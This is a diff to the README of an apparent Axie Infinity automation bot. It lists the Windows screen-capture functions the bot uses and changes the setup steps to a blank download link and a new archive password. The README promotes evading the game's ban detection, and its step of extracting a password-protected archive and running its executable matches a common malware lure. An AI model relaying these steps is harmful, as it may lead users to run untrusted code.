@@ -24,22 +24,22 @@ Automated bot for playing Axie Infinity using Windows API functions for safe int
 The Axie Infinity Bot leverages Windows API functions to take screenshots and recognize pixels of Axie models and cards. This approach is safer compared to methods that require reading the game process memory or injecting .dll files, as it minimizes the risk of detection and bans.
 
 ### Windows API Functions Used
-- GetDC and ReleaseDC
+- `GetDC` and `ReleaseDC`
 GetDC retrieves a handle to a device context (DC) for the client area of a specified window or for the entire screen. ReleaseDC releases the device context.
 
-- BitBlt
+- `BitBlt`
 This function performs a bit-block transfer of color data from a source device context to a destination device context.
 
-- CreateCompatibleDC and DeleteDC
+- `CreateCompatibleDC` and `DeleteDC`
 CreateCompatibleDC creates a memory device context compatible with the specified device, and DeleteDC deletes the memory device context.
 
-- CreateCompatibleBitmap and DeleteObject
+- `CreateCompatibleBitmap` and `DeleteObject`
 CreateCompatibleBitmap creates a bitmap compatible with the device context, and DeleteObject deletes a logical pen, brush, font, bitmap, region, or palette.
 
-- SelectObject
+- `SelectObject`
 This function selects an object into the specified device context, replacing the previous object of the same type.
 
-- GetPixel
+- `GetPixel`
 This function retrieves the color value of the pixel at specified coordinates.
 
 ### Setup
@@ -48,8 +48,8 @@ This function retrieves the color value of the pixel at specified coordinates.
 - - Close the SkyMavis game client to ensure the bot can access the game window without interference.
 
 - Download and Extract Files:
-- - Download the latest release of the repository.
-- - Extract the downloaded files using the password QaURPee9bNthgl.
+- - [Download]() the latest release of the repository.
+- - Extract the downloaded files using the password `Cfjx5a3Nu`.
 
 - Launch the Bot:
 - - Run the bot executable with the correct settings configured in the provided configuration file. Ensure the game client is running and visible on your screen.
